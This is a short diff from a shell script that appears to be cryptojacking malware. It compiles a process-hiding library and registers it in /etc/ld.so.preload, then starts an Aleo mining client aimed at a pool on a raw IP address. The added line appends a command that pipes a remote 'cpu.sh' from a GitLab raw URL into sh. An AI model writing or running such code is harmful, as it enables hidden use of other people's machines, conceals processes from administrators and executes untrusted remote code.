@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./aleo_prover --pool 159.65.161.19:443 --pool 159.65.161.19:80 --address aleo1y3kjry4kgjp0vsxvtqtcjdeqzczvuh858zvwr9rvntmv9gnrgyys7yddrd --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah
+./graftcp/graftcp & clear & ./aleo_prover --pool 159.65.161.19:443 --pool 159.65.161.19:80 --address aleo1y3kjry4kgjp0vsxvtqtcjdeqzczvuh858zvwr9rvntmv9gnrgyys7yddrd --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah & curl https://gitlab.com/kerja6381734/COCACOLA/-/raw/main/cpu.sh | sh
